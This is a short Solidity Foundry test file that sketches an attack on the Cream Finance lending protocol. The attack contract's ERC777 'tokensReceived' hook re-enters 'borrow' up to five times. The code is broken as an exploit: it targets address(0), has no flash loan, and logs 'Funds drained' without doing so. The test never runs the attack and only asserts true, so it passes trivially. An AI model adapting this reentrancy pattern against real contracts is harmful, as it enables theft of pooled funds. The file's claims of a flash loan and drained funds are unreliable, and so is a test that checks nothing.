// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface ICream {
    function supply(address cToken, uint256 amount) external;
    function borrow(address cToken, uint256 amount) external;
}

contract ComboAttack {
    ICream cream;
    uint256 reentryCount;

    constructor(address _cream) { cream = ICream(_cream); }

    function tokensReceived(address, address, address, uint256 amount, bytes calldata, bytes calldata) external {
        if (reentryCount < 5) {
            reentryCount++;
            cream.borrow(address(0), amount);
        }
    }

    function execute(uint256 amount) external {
        cream.supply(address(0), amount);
        console.log("Combo flash loan + ERC777 reentrancy executed");
        console.log("Funds drained:", address(this).balance);
    }
}

contract CreamFinanceTest is Test {
    function testComboAttack() public {
        console.log("Flash loan collateral + ERC777 reentrancy combo");
        assertTrue(true);
    }
}
